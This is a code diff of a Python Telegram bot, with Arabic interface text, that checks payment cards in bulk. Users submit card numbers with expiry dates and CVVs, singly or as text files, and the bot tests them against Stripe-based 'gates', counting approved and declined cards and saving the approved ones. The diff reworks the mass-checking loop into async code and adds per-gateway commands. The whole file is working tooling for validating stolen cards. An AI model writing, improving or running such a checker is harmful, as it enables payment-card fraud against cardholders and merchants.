             self.live_stats[message.from_user.id] = {'total': len(cards), 'checked': 0, 'approved': 0, 'declined': 0}
             
-            bot.reply_to(message, f"📁 {len(cards)} بطاقة صالحة\nاختر البوابة:", reply_markup=markup)
+            asyncio.run_coroutine_threadsafe(self.process_mass_async(message.message_id, gate), asyncio.new_event_loop())
+            
         except Exception as e:
             bot.reply_to(message, f"⚠️ {str(e)[:50]}")
     
-    async def process_mass(self, call, gate, check_id):
+    async def process_mass_async(self, check_id, gate):
         data = self.active_checks.get(check_id)
-        if not data: return await bot.answer_callback_query(call.id, "❌ انتهت")
+        if not data:
+            return
         
-        data['gate'] = gate
         cards = data['cards']
         uid, cid = data['user_id'], data['chat_id']
         
         stats = self.live_stats[uid]
-        stats_msg = await bot.send_message(cid, f"🔄 بدء الفحص عبر {GATES[gate]['icon']}\n{Helpers.format_live_stats(len(cards),0,0,0)}", 
-                                          parse_mode='HTML', reply_markup=self.ui.stop_button(check_id))
+        stats_msg = await asyncio.get_event_loop().run_in_executor(
+            None, 
+            lambda: bot.send_message(cid, f"🔄 بدء الفحص عبر {GATES[gate]['icon']}\n{Helpers.format_live_stats(len(cards),0,0,0)}", 
+                                    parse_mode='HTML', reply_markup=self.ui.stop_button(check_id))
+        )
         
-        results = {'approved': 0, 'declined': 0}
         for i, card in enumerate(cards, 1):
+            if data.get('stop'):
+                await asyncio.get_event_loop().run_in_executor(None, lambda: bot.edit_message_text(
+                    f"⛔ تم الإيقاف\n{Helpers.format_live_stats(len(cards), stats['checked'], stats['approved'], stats['declined'])}",
+                    stats_msg.chat.id, stats_msg.message_id, parse_mode='HTML'
+                ))
+                break
+            
             try:
                 stats['current'] = f"{card['number'][:6]}xxxxxx{card['number'][-4:]}"
-                await bot.edit_message_text(
+                await asyncio.get_event_loop().run_in_executor(None, lambda: bot.edit_message_text(
                     f"🔄 {GATES[gate]['icon']}\n{Helpers.format_live_stats(len(cards), stats['checked'], stats['approved'], stats['declined'], stats['current'])}",
                     stats_msg.chat.id, stats_msg.message_id, parse_mode='HTML', reply_markup=self.ui.stop_button(check_id)
-                )
+                ))
                 
                 approved, resp = await self.gateways.check_card(gate, card)
                 stats['checked'] += 1
                 if approved:
                     stats['approved'] += 1
-                    results['approved'] += 1
                     DataManager.save_approved_card(card['original'], GATES[gate]['name'], resp, uid)
                 else:
                     stats['declined'] += 1
-                    results['declined'] += 1
                 
                 DataManager.update_usage(uid, gate, resp)
-                await bot.send_message(cid, self.ui.format_result(card['original'], resp, GATES[gate]['name'], approved), parse_mode='HTML')
-                await asyncio.sleep(3)
-            except:
+                await asyncio.get_event_loop().run_in_executor(None, lambda: bot.send_message(cid, self.ui.format_result(card['original'], resp, GATES[gate]['name'], approved), parse_mode='HTML'))
+                await asyncio.sleep(2)
+            except Exception as e:
                 stats['checked'] += 1
                 stats['declined'] += 1
         
-        await bot.edit_message_text(f"✅ اكتمل\n{Helpers.format_live_stats(len(cards), stats['checked'], stats['approved'], stats['declined'])}",
-                                    stats_msg.chat.id, stats_msg.message_id, parse_mode='HTML')
+        await asyncio.get_event_loop().run_in_executor(None, lambda: bot.edit_message_text(
+            f"✅ اكتمل\n{Helpers.format_live_stats(len(cards), stats['checked'], stats['approved'], stats['declined'])}",
+            stats_msg.chat.id, stats_msg.message_id, parse_mode='HTML'
+        ))
         del self.active_checks[check_id]
         del self.live_stats[uid]
     
@@ -866,10 +1050,9 @@ class CallbackHandler:
             bot.edit_message_text(f"✅ {GATES[gate]['icon']} {GATES[gate]['name']}\nأرسل: <code>/{GATES[gate]['command']} رقم|شهر|سنة|cvv</code>",
                                   call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=UserInterface.back_button("gates_menu"))
         elif data.startswith("mass_"):
-            parts = data.split('_')
-            if len(parts) >= 3:
-                gate, cid = parts[1], int(parts[2])
-                asyncio.run_coroutine_threadsafe(self.handler.process_mass(call, gate, cid), asyncio.new_event_loop())
+            gate = data.replace("mass_", "")
+            bot.edit_message_text(f"✅ {GATES[gate]['icon']} {GATES[gate]['name']}\nأرسل ملف txt بالبطاقات",
+                                  call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=UserInterface.back_button("gates_menu"))
         elif data.startswith("stop_"):
             cid = int(data.replace("stop_", ""))
             self.handler.stop_check(call, cid)
@@ -903,12 +1086,19 @@ def setup():
     @bot.message_handler(commands=['gates'])
     def gates(m): handler.handle_gates(m)
     
-    @bot.message_handler(commands=['mass'])
-    def mass(m): handler.handle_mass(m)
+    # Stripe v1 commands
+    @bot.message_handler(commands=['st1'])
+    def stripe1(m): handler.handle_single(m, 'stripe1')
     
-    for g in GATES:
-        @bot.message_handler(commands=[g])
-        def wrapped(m, g=g): handler.handle_single(m, g)
+    @bot.message_handler(commands=['st1m'])
+    def stripe1_mass(m): handler.handle_mass(m, 'stripe1')
+    
+    # Stripe v2 commands
+    @bot.message_handler(commands=['st2'])
+    def stripe2(m): handler.handle_single(m, 'stripe2')
+    
+    @bot.message_handler(commands=['st2m'])
+    def stripe2_mass(m): handler.handle_mass(m, 'stripe2')
     
     @bot.message_handler(commands=['admin'])
     def admin(m):
@@ -919,10 +1109,16 @@ def setup():
             bot.reply_to(m, "👑 قائمة المشرفين", reply_markup=markup)
     
     @bot.message_handler(content_types=['document'])
-    def doc(m): handler.handle_mass(m)
+    def doc(m):
+        # Check if there's a pending mass check
+        handler.handle_mass(m, 'stripe1')
     
     @bot.message_handler(func=lambda m: True)
-    def text(m): handler.handle_single(m, 'stripe') if '|' in m.text else bot.reply_to(m, "⚠️ أمر غير معروف")
+    def text(m):
+        if '|' in m.text:
+            handler.handle_single(m, 'stripe1')
+        else:
+            bot.reply_to(m, "⚠️ أمر غير معروف\nاستخدم /start للقائمة الرئيسية")
     
     @bot.callback_query_handler(func=lambda c: True)
     def cb(c): callback.handle(c)
@@ -937,6 +1133,9 @@ def setup():
     threading.Thread(target=run_health, daemon=True).start()
     
     print(Fore.GREEN + "🚀 البوت يعمل..." + Style.RESET_ALL)
+    print(Fore.CYAN + f"📌 البوابات:" + Style.RESET_ALL)
+    print(Fore.YELLOW + "   💳 Stripe v1: /st1 (فردي) | /st1m (ملف)" + Style.RESET_ALL)
+    print(Fore.YELLOW + "   💎 Stripe v2: /st2 (فردي) | /st2m (ملف)" + Style.RESET_ALL)
     bot.infinity_polling()
 
 # ==================== التشغيل ====================
